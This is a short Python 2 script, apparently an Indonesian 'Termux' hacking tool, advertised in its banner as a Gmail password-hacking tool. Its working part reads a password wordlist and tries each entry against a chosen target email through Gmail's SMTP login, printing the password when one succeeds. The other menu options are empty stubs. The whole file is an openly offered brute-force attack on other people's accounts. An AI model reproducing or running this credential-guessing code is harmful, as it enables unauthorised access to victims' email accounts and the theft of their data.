#!/usr/bin/python
'''create by Mr.ID'''

"\033[91m"
"\033[92m"
"\033[93m"
"\033[94m"
"\033[95m"
"\033[96m"



import smtplib
from os import system

def main():
    print '\033[92m================================================='
    print '               $PASUKAN TERMUX                  '
    print'*************************************************'
    print '#################Creat by Mr ID #################   '
    print '----------Tools hacked Gmail password------------   '
    print '++++++++++++ vTools versi ()0.1Beta +++++++++++++  '
    print ' #####MOTO=Hanya butuh akses ke sebuah system####'
    print '================================================='


main()
print '[1] Brute Email'
print '[2] Cek ID email'
print '[3] Cek ID teman'
print '[4] Cek media sosial email'
print '[00] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('Password list :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '\033[92m [+] Berhasil ditemukan Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '\033[92m [+] Berhasil ditemukan, password :' + password + '     ^_^'

            break
         else:
            print '\033[91m [!] password tidak cocok => ' + password
login()
if option == 2:
    id_email=raw_input('Email: ')
    print ',id_email,blom tersedia cek id gan'
    main()
if option == 3:
    id_email=raw_input('Email: ')
    print ',id_email,blom tersedia cek id teman gan'
    main()
if option == 4:
    id_email=raw_input('Email: ')
    print ',id_email,blom tersedia cek media sosial gan'
    main()